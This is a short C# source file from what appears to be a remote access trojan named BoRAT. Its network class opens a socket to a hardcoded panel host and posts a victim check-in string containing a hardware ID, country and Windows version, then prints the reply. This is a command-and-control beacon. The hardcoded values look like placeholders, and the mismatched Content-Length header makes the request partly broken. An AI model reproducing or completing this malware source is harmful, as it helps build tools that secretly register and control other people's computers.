using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;

namespace BoRAT.Network
{
    class Http
    {
        static string host = "panel.com";
        public static void Request()
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(host, 80);

            if (socket.Connected)
            {
                try
                {
                    // Send
                    string request = "POST / HTTP/1.1\r\n" +
                        "Host: " + host + "\r\n" +
                        "Content-Length: 0\r\n\r\n" +
                        "HWID|1|barbados|Windows 7|32&1&1";

                    byte[] bytes = Encoding.ASCII.GetBytes(request);
                    socket.Send(bytes, bytes.Length, SocketFlags.None);

                    // Receive
                    byte[] rec = new byte[1024];
                    socket.Receive(rec, rec.Length, SocketFlags.None);
                    string response = Encoding.ASCII.GetString(rec);

                    socket.Close();

                    Console.Write(request + "\r\n\r\n");
                    Console.Write(response);
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }

        }
    }
}
